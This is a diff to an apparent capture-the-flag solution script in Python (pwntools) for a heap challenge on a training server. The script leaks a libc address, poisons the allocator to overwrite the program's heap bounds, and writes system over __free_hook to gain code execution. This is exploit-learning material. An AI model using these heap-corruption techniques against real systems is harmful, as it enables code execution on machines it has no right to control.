@@ -1,5 +1,7 @@
 from pwn import *
 
+# This program allows you to allocate and free chunks, print content of any memory location and to write everywhere inside the boundaries given by the two variables min_heap and max_heap, set respectively to the start address if the heap and 4096 Bytes above min_heap.
+
 CHALL_PATH = './playground_patch'
 CHALL = ELF(CHALL_PATH, checksec=False)
 LIBC = ELF('../../env/libc-2.27.so', checksec=False)
@@ -53,7 +55,6 @@ def write(c, addr, msg) :
 
 if args.REMOTE:
     c = remote('playground.training.offensivedefensive.it', 8080, ssl=True)
-    # print(c.recvline())
 elif args.GDB:
     c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
     print(c.recvline(keepends=False).decode('utf-8'))
@@ -79,19 +80,19 @@ malloc(c, 0x10)
 free(c, chunk)
 
 # Leaking libc address and computing __free_hook one
-addr = show(c, chunk, 1)[0].split(':   ')[1].split('\n')[0]
+addr = show(c, chunk, 1)[0].split(':   ')[1]
 LIBC.address = int(addr, 0x10) - 0x3EBCA0
 print(f'LIBC base: {hex(LIBC.address)}')
 free_hook = LIBC.sym['__free_hook']
 print('free_hook addr: ', hex(free_hook))
 
 # Arbitrary chunk allocation attack s.t. new chunk size is written over min_heap, so we can then overwrite max_heap with the address of __free_hook
-malloc(c, 0x500)                        # filling that chunk again (otherwise makes problems)
-chunk = malloc(c, 0x20)                 # new chunk for arbitrary chunk allocation
+malloc(c, 0x500)                    # filling that chunk again (otherwise makes problems)
+chunk = malloc(c, 0x20)             # new chunk for arbitrary chunk allocation
 free(c, chunk)
-write(c, chunk, p64(max_heap))          # this makes the chunk size overwrite min_heap
-chunk = malloc(c, 0x20)                 # emptying the fastbin list
-malloc(c, 0x20)                         # allocating over max_heap to overwrite min_heap
+write(c, chunk, p64(max_heap))      # this will make the chunk size overwrite min_heap
+chunk = malloc(c, 0x20)             # emptying the fastbin list
+malloc(c, 0x20)                     # allocating over max_heap to overwrite min_heap
 
 write(c, max_heap, p64(free_hook + 0x1000))     # overwriting max_heap with the address of __free_hook
 write(c, free_hook, p64(LIBC.sym["system"]))    # writing system address over __free_hook
